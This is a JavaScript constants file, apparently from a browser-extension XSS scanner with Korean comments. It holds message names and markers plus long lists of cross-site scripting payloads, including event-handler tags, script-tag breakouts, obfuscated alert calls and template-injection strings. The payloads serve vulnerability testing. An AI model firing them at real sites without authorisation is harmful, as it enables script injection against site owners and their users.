//
// 요소 ID
export const USER_OPTIONS      = ["url", "param", "delay", "useCookies"]; // 사용자 입력 요소 ID
export const SCAN_VAL          = ["test-param", "current_url"];
export const ERROR_BANNER      = "errorBanner";               // 에러 출력 요소 ID
export const SIGN              = "user_option";               // html 요소 식별 마커  
export const OBSERV_DATA       = "opservation";               // 
export const POPUP4_TAB        = "find_url";                  // 

// 
// 테스트 표시 요소 
export const XSS_MARKER        = "Qw4pl0ui";                  // reflection  확인 문자열
export const XSS_INJECT_TARGET = "XSS_T";                     // 공격 파라미터 표시 문자열
export const START_CHUNCK      = "P0tOc";                     // 필터링 확인 시작 문자열
export const END_CHUNK         = "ZnFer";                     // 필터링 확인 끝 문자열 

//
// 용도별 메세지
export const START_MSG        = {status : "started"};         // 테스트 시작 응답 메세지
export const FILTER_CHECK     = "START_FILTER";               // 필터 체크 시작 메세지
export const REPLAY_CHECK     = "REPLAY_FILTER";              // 재스캔 메세지
export const ATTACK_START     = "START_ATTACK";               // 공격 시작 메세지
export const ERROR_MSG        = "ERROR";                      // 에러 메세지
export const HTML_CAPTURED    = "HTML_CAPTURED";              // 현재 url html 캡처 메세지
export const FILTER_RESULT    = "FILTER_RESULT_MSG";          // 필터링 결과 메세지
export const FILTER_DATA      = "ft-msg";                     // 필터링 데이터 msg
export const ATTACK_RESULT    = "ATTACK_RESULT_MSG";          // 공격 결과 메세지
export const ATTACK_DATA      = "atk-msg";                    // 공격 데이터 msg
export const mov_popup2       = "GO_TO_POPUP2";               // popup2 이동 메세지
export const mov_result       = "GO_TO_RESULT";               // popup3 이동 메세지

//
// 자바스크립트 추출 표현식 
export const JAVASCRIPT_REGEXP = /<script[^>]*>([\s\S]*?)<\/script>/gi;
export const VULN_REGEXP       = /Vulnerable/

export const ABNORMAL_START    = "abnormal_start";
export const ABNORMAL_END      = "abnormal_end";

export const OPTION_KEYS = {
    "url"           : "url"    , 
    "target_params" : "param"  ,
    "delay"         : "delay",
    "cookie"        : "useCookies"
}

export const VOID_TAGS = [
    "area", "base", "br", "col", "embed", "hr","img", 
    "input", "link", "meta", "source","track", "wbr"
];

export const REQUEST_ATTRIBUTES = ([
  "href", "src", "action", "formaction", 
  "data", "poster", "xlink:href"   
]);

export const FG = "XSS_PAY_FUNC_INJECT"

export const PAY_FUNC = [
		"alert", "confirm", "prompt", "alert.bind()", "confirm.call()",
		"prompt.valueOf()", "print", "console.log", "console.error", "console.warn",
];

export const PAY_HTML = [
  "<sVg/onload=XSS_PAY_FUNC_INJECT(1) class=aswerf>",
  "<ScRipt class=aswerf>XSS_PAY_FUNC_INJECT(1)</script>",
  "<iframe srcdoc=\"<input onauxclick=XSS_PAY_FUNC_INJECT(1)>\" class=aswerf></iframe>",
  "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=aswerf>",
  "<audio controls ondurationchange=XSS_PAY_FUNC_INJECT(1) id=aswerf><source src=1.mp3 type=audio/mpeg></audio>",
  "<div contextmenu=xss><p>1<menu type=context class=aswerf id=xss onshow=XSS_PAY_FUNC_INJECT(1)></menu></div>",
  "<iFrAme/src=jaVascRipt:XSS_PAY_FUNC_INJECT(1) class=aswerf></iFramE>",
  "<xmp><p title=\"</xmp><svg/onload=XSS_PAY_FUNC_INJECT(1) class=aswerf>",
  "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
  "<audio controls ondurationchange=v(1)><source src=1.mp3 type=audio/mpeg></audio>",
  "<div contextmenu=xss><p>1<menu type=context onshow=alert(1)></menu></div>",
  "<iFrAme/src=jaVascRipt:XSS_PAY_FUNC_INJECT(1)></iFramE>",
  "<xmp><p title=\"</xmp><svg/onload=XSS_PAY_FUNC_INJECT(1)>",
  "<sVg/onload=XSS_PAY_FUNC_INJECT(1)>",
  "<ScRipt>XSS_PAY_FUNC_INJECT(1)</script>",
  "<cst class=aswerf>",
  "<video controls oncanplay=XSS_PAY_FUNC_INJECT(1) class=aswerf><source src=1.mp4></video>",
  "<canvas onwebglcontextlost=XSS_PAY_FUNC_INJECT(1) class=aswerf></canvas>",
  "<dialog open onclose=XSS_PAY_FUNC_INJECT(1) class=aswerf>XSS</dialog>",
  "<slot onslotchange=XSS_PAY_FUNC_INJECT(1) class=aswerf></slot>",
  "<template onload=XSS_PAY_FUNC_INJECT(1) class=aswerf></template>",
  "<picture onload=XSS_PAY_FUNC_INJECT(1) class=aswerf><source srcset=x><img src=x></picture>",
  "<track onload=XSS_PAY_FUNC_INJECT(1) class=aswerf>",
  "<source onload=XSS_PAY_FUNC_INJECT(1) class=aswerf>",
  "<progress onload=XSS_PAY_FUNC_INJECT(1) class=aswerf></progress>",
  "<meter onload=XSS_PAY_FUNC_INJECT(1) class=aswerf></meter>",
  "<output onload=XSS_PAY_FUNC_INJECT(1) class=aswerf></output>",
  "<datalist onload=XSS_PAY_FUNC_INJECT(1) class=aswerf></datalist>",
  "<keygen onload=XSS_PAY_FUNC_INJECT(1) class=aswerf>",
  "<summary ontoggle=XSS_PAY_FUNC_INJECT(1) class=aswerf>Click</summary>",
  "<details ontoggle=XSS_PAY_FUNC_INJECT(1) class=aswerf open><summary>XSS</summary></details>",
  "<div onpointerrawupdate=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div ongotpointercapture=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div onlostpointercapture=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div onpointercancel=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div onanimationstart=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div onanimationend=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div onanimationiteration=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div ontransitionstart=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div ontransitionrun=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div ontransitioncancel=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div onselectionchange=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div onselectstart=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div onbeforeinput=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div oninputsourceschange=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div oncompositionstart=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div oncompositionupdate=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>",
  "<div oncompositionend=XSS_PAY_FUNC_INJECT(1) class=aswerf></div>"
]

export const PAY_JAVASCRIPT_TAG = [
  "</sCRipt><sVg/onload=alert(1)>",
	"</scRiPt><sVG/onload=confirm(1)>",
	"</sCrIpt><SVg/onload=prompt(1)>",
	"</sCrIpt><SVg/onload=print(1)>",
	"</sCriPt><ScRiPt>alert(1)</sCrIpt>",
	"</scRipT><sCrIpT>confirm(1)</SCriPt>",
	"</ScripT><ScRIpT>prompt(1)</scRIpT>",
	"</ScripT><ScRIpT>print(1)</scRIpT>"
]

export const PAY_JAVASCRIPT_CODE = [
  "alert(1)",
  "confirm(1)",
  "prompt(1)",
  "print(1)",
  "alert.call(null,1)",
  "confirm.call(null,1)",
  "prompt.call(null,1)",
  "alert.apply(null,[1])",
  "prompt.apply(null,[1])",
  "confirm.apply(null,[1])",
  "window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
  "this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
  "self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
  "globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);",
  "parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])",
  "top[/al/.source+/ert/.source](/XSS/.source)",
  "frames[/al/.source+/ert/.source](/XSS/.source)",
  "self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])",
  "this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
  "this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
  "window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])",
  "{{toString().constructor.constructor('alert(1)')()}}",
  "{{-function(){this.alert(1)}()}}",
  "</sCRipt><sVg/onload=alert(1)>",
  "</scRiPt><sVG/onload=confirm(1)>",
  "</sCrIpt><SVg/onload=prompt(1)>",
  "</sCrIpt><SVg/onload=print(1)>",
  "</sCriPt><ScRiPt>alert(1)</sCrIpt>",
  "</scRipT><sCrIpT>confirm(1)</SCriPt>",
  "</ScripT><ScRIpT>prompt(1)</scRIpT>",
  "</ScripT><ScRIpT>print(1)</scRIpT>",
]

export const PAY_EVENT = [
  "onload",
  "onerror",
  "onmouseover",
  "onmouseenter",
  "onmouseleave",
  "onmouseenter",
  "onmouseenter",
  "onpointerover",
  "onpointerdown",
  "onpointerenter",
  "onpointerleave",
  "onpointermove",
  "onpointerout",
  "onpointerup",
  "ontouchstart",
  "ontouchend",
  "ontouchmove",
  "ontransitionend",
  "oncontentvisibilityautostatechange"
]

export const PAY_ATTR_FUNC = [
  "=alert(1) class=aswerf ",
  "=confirm(1) class=aswerf ",
  "=alert.call(null,1) class=aswerf ",
  "=confirm.call(null,1) class=aswerf ",
  "=prompt.call(null,1) class=aswerf ",
  "=alert.apply(null,1) class=aswerf ",
  "=confirm.apply(null,1) class=aswerf ",
  "=prompt.apply(null,1) class=aswerf ",
  "=print(1) class=aswerf "
]